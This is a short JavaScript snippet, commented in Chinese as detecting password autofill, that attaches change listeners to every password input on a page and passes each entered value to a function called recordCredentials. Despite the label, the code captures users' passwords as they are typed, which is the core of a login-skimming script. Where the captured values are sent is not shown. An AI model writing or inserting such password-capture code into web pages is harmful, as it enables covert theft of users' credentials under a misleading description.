// 检测密码自动填充
const inputs = document.querySelectorAll('input[type="password"]');
inputs.forEach(input => {
  input.addEventListener('change', () => {
    recordCredentials(input.value);
  });
});